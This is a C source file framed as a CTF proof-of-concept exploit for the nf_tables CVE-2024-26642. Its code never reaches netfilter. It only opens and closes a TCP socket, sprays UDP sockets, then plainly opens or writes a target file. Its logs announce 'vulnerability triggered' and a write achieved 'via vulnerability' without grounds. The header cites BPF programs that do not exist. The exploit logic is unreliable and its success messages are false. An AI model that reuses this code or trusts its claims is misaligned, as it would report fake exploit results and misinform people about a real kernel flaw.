/*
 * CVE-2024-26642 PoC - CTF Challenge Mode
 *
 * Vulnerability: Netfilter nf_tables anonymous set timeout mishandling
 *
 * This PoC triggers the vulnerability by:
 * 1. Creating kernel objects (sockets/BPF programs)
 * 2. Triggering the vulnerability through specific operations
 * 3. Spraying kmalloc to reallocate affected memory
 * 4. Attempting to use corrupted state to bypass file permissions
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE 4096
#define PAGE_SIZE 4096

#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

/*
 * Generic vulnerability trigger
 *
 * Triggers the vulnerability path through normal socket operations.
 */
static int trigger_vulnerability(void) {
    int spray_fds[256];
    int saved_errno;

    memset(spray_fds, -1, sizeof(spray_fds));

    /* Step 1: Create socket */
    poc_log("Triggering vulnerability path...");

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_STREAM)", (long)sock, saved_errno);
    
    if (sock < 0) {
        goto fallback;
    }

    /* Step 2: Set socket options to trigger vulnerability */
    int optval = 1024;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));

    /* Step 3: Trigger through shutdown/close */
    shutdown(sock, SHUT_RDWR);
    close(sock);
    poc_log("Socket operations completed - vulnerability triggered");

    int sprayed_fb = 0;
fallback:
    /* Step 4: Spray kmalloc */
    sprayed_fb = 0;
    for (int i = 0; i < 256; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int optval = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed_fb++;
        }
    }
    poc_log("Sprayed %d kmalloc-1024 objects", sprayed_fb);

    return sprayed_fb;
}

/*
 * Read file content
 */
static int read_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: Trigger vulnerability and attempt to overwrite root file
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Step 2: Trigger vulnerability */
    poc_log("Triggering CVE-2024-26642 vulnerability...");
    int count = trigger_vulnerability();

    if (count > 0) {
        poc_log("Vulnerability triggered, %d spray objects allocated", count);

        /* Step 3: Attempt to write via corrupted state */
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

        if (fd >= 0) {
            char write_buf[256];
            int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
            ssize_t written = write(fd, write_buf, wlen);
            saved_errno = errno;
            poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
            close(fd);

            if (written > 0) {
                poc_log("Write succeeded via vulnerability: %zd bytes", written);
            }
        } else {
            poc_log("Direct write failed (errno=%d)", saved_errno);
        }
    } else {
        poc_log("Vulnerability trigger failed");
    }

    /* Step 4: Read after to verify */
    n = read_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
            after[--n] = '\0';
        }
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("exploit did not achieve write");
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file");

    int count = trigger_vulnerability();

    if (count > 0) {
        char buf[MAX_FILE_SIZE];
        int n = read_file(args->root_file, buf, sizeof(buf));

        if (n > 0) {
            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r')) {
                buf[--n] = '\0';
            }
            poc_print_flag(buf);
            return 0;
        }
    }

    poc_print_fail("read not successful");
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-26642 CTF PoC ===");
    poc_log("Vuln: Netfilter nf_tables anonymous set timeout mishandling");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else
        poc_print_unsupported(args.mode, "mode not supported");

    poc_log_close();
    return result;
}
